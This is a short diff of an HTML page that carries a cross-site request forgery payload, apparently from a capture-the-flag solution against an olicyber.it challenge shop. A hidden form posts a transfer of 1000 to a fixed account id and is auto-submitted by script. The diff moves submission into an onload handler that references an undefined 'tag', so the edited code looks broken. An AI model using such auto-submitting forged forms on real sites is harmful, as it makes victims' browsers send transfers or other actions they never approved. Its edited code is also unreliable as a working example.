@@ -1,10 +1,12 @@
-<html>
+<html onload="autoClick(tag)">
   <form action="https://easyshop.challs.olicyber.it/send" method="POST">
     <input name="to" value="f8ce5fabbd34cb6c62f44202f05d3e7998425cbf21119a49757063eea57273a4" />
-    <input name="amount" value="1000" />
+    <input id="subButton" name="amount" value="1000" />
   </form>
   <script>
-    document.getElementsByTagName("form")[0].submit();
+    function autoClick(tag){
+      tag.submit();
+    }
   </script>
 </html>
 
